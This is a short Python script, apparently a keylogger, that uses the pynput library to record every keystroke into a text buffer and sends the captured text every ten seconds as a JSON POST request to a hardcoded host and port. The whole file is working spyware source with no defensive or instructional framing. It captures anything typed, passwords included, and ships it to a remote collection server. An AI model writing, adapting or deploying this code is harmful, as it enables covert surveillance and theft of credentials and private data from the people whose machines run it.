from pynput import keyboard
import requests
import json
import threading

text = ""

ip_address = "192.168.50.91"
port_number = "8080"
time_interval = 10

def send_post_req():
    try:
        payload = json.dumps({"keyboardData": text})
        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type": "application/json"})
        # x = requests.post(f"http://{ip_address}:{port_number}", data="INITIATE", headers={"Content-Type": "application/json"})
        timer = threading.Timer(time_interval, send_post_req)
        timer.start()
    except Exception as e:
        print(f"Couldn't complete request! Error: {e}")

def on_press(key):
    global text

    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")

with keyboard.Listener(
    on_press=on_press) as listener:
    send_post_req()
    listener.join()